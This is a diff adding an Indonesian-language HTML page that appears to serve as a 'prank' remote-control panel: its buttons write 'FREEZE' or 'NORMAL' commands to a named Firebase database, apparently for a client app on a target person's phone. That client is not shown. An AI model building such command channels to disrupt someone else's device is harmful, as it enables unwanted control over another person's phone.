@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Remote Kontrol Prank</title>
+    <style>
+        body { 
+            text-align: center; 
+            background: #121212; 
+            color: #ffffff; 
+            font-family: sans-serif; 
+            padding-top: 40px; 
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+        }
+        h2 { color: #ff4757; }
+        .status-box {
+            background: #1e1e1e;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            border: 1px solid #333;
+        }
+        button { 
+            width: 100%;
+            padding: 18px; 
+            font-size: 18px; 
+            font-weight: bold;
+            margin: 12px 0; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+        }
+        .btn-freeze { background: #ff4757; color: white; }
+        .btn-stop { background: #2ed573; color: white; }
+        button:active { opacity: 0.8; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Remote Kontrol HP Target</h2>
+        
+        <div class="status-box">
+            <p>Status Perintah:</p>
+            <h3 id="status" style="color: #ffa502; margin: 5px 0;">Menunggu...</h3>
+        </div>
+        
+        <!-- Tombol Kontrol Utama -->
+        <button class="btn-freeze" onclick="kirimPerintah('FREEZE')">⚠️ MULAI FREEZE</button>
+        <button class="btn-stop" onclick="kirimPerintah('NORMAL')">✅ MATIKAN / NORMAL</button>
+    </div>
+
+    <!-- Script Firebase versi Web -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        // Konfigurasi database Firebase kamu
+        const firebaseConfig = {
+            databaseURL: "https://prankremote-fda79-default-rtdb.firebaseio.com/"
+        };
+        
+        // Inisialisasi Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function kirimPerintah(aksi) {
+            db.ref('perintah').set({
+                aksi: aksi,
+                timestamp: Date.now()
+            }, function(error) {
+                if (error) {
+                    document.getElementById("status").innerText = "Gagal Mengirim!";
+                    document.getElementById("status").style.color = "#ff4757";
+                } else {
+                    document.getElementById("status").innerText = "Berhasil Kirim: " + aksi;
+                    document.getElementById("status").style.color = "#2ed573";
+                }
+            });
+        }
+    </script>
+</body>
+  </html>
+  
